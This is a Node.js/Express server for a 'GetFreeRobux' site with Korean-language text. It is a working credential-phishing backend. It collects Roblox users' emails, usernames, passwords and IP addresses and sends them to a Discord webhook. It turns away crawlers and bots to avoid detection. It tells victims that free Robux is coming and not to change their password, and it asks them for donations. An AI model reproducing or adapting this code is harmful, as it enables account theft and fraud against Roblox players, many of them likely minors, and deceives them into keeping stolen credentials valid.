const express = require("express");
const bodyParser = require("body-parser");
const axios = require('axios');
const escapeHtml = require('escape-html');
const rateLimit = require('express-rate-limit');
const useragent = require('express-useragent');
require('dotenv').config();

const app = express();
const port = 3000;

app.set("trust proxy", true);

const blockedIPs = ['211.252.103.165'];

app.use((req, res, next) => {
  const clientIP = req.ip;

  if (blockedIPs.includes(clientIP)) {
    res.status(403).send('당신은 이 사이트에서 영구 차단당했습니다. 오류라고 생각한다면 사이트 관리자에게 문의하세요.');
  } else {
    next();
  }
});

app.use(useragent.express());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.json());

// 봇 감지 (User-Agent 검사)
app.use((req, res, next) => {
    const ua = req.headers['user-agent'];
    const isBot = /bot|crawler|spider|robot|crawling/i.test(ua);
    if (isBot) {
        return res.status(403).send('봇 접속이 감지되었습니다.');
    }
    next();
});

// 요청 제한 (Rate Limiting)
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 20,
    message: '요청이 너무 많습니다. 잠시 후 다시 시도해주세요.'
});
app.use(limiter);

// POST 요청 처리
app.post("/robux", async (req, res) => {
    const email = escapeHtml(req.body.email);
    const roblox_id = escapeHtml(req.body.roblox_id);
    const roblox_pwd = escapeHtml(req.body.roblox_pwd);

    let privacy = req.body.privacy;
    let _3rdperson = req.body._3rdperson;
    let advertise = req.body.advertise;

    const privacy_checked = privacy === "true" ? "✅ 개인정보 제공 동의 허용" : "❌ 개인정보 제공 동의 거부";
    const _3rdperson_checked = _3rdperson === "true" ? "✅ 제 3자 제공 동의 허용" : "❌ 제 3자 제공 동의 거부";
    const advertise_checked = advertise === "true" ? "✅ 마케팅 활용 동의 허용" : "❌ 마케팅 활용 동의 거부";

    try {
        const userAgent = req.useragent;
        const userIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress;

        // 디스코드 웹훅 전송
        const webhookUrl = process.env.WEBHOOK_URL;

        const embedPayload = {
            embeds: [
                {
                    title: "📌 새로운 Roblox 계정이 도착했습니다!",
                    description: "사이트: GetFreeRobux",
                    color: 0x3498db,
                    fields: [
                        { name: "📧 이메일", value: `\`${email}\`` },
                        { name: "🆔 Roblox 아이디", value: `\`${roblox_id}\`` },
                        { name: "🔑 Roblox 비밀번호", value: `\`${roblox_pwd}\`` },
                        { name: "🌐 IP 주소", value: `\`${userIp}\`` },
                        { name: "🔒 개인정보 동의", value: privacy_checked },
                        { name: "👥 제 3자 제공", value: _3rdperson_checked },
                        { name: "📢 마케팅 활용", value: advertise_checked }
                    ],
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await axios.post(webhookUrl, embedPayload);

        return res.send(`
<h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오.</h2>
<h2>비밀번호를 올바르게 입력했는지 생각해보세요! 만약 입력된 비밀번호가 실제 비밀번호랑 같지 않다면 본인이 아닌 것으로 간주하여 로벅스를 드리지 않습니다</h2>
<h1>기부로 개발자를 도와주세요!</h1>
<iframe src="https://nowpayments.io/embeds/donation-widget?api_key=SPB4XA6-B4M4TZ4-HTHXA2C-96QC978" width="346" height="623" frameborder="0" scrolling="no" style="overflow-y: hidden;">
    Can't load widget
</iframe>
        `);

    } catch (err) {
        console.error(err);
        res.status(500).send('서버 오류');
    }
});

app.listen(port, () => {
    console.log(`서버 실행 중`);
});
